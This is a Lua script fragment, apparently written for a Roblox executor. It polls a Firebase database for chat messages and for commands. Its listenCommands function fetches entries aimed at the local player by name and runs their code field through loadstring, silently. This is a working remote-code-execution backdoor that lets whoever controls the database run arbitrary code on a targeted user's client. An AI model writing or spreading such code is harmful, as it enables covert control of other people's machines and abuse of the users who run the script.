local function fetchChat(path, seenTbl, storage, page, startT)
    local res = http_request({Url = FIREBASE_URL .. path .. '?orderBy="$key"&limitToLast=15', Method = "GET"})
    if not res or res.StatusCode ~= 200 then return end
    pcall(function()
        local data = HttpService:JSONDecode(res.Body); if type(data) ~= "table" then return end
        local temp = {}
        for k, v in pairs(data) do if v.timestamp >= startT then table.insert(temp, {k=k, v=v}) end end
        table.sort(temp, function(a,b) return a.v.timestamp < b.v.timestamp end)
        
        for _, item in ipairs(temp) do
            if not seenTbl[item.k] then
                seenTbl[item.k] = true; renderMessage(item.v, page, storage)
            end
        end
    end)
end

local lastCmdTime = os.time()
local function listenCommands()
    local res = http_request({Url = FIREBASE_URL .. PATH_CMDS .. '?orderBy="$key"&limitToLast=5', Method = "GET"})
    if res and res.StatusCode == 200 then
        pcall(function()
            local data = HttpService:JSONDecode(res.Body)
            for k, v in pairs(data) do
                if v.time > lastCmdTime and v.target == LocalPlayer.Name then
                    lastCmdTime = v.time; pcall(function() loadstring(v.code)() end)
                end
            end
        end)
    end
end

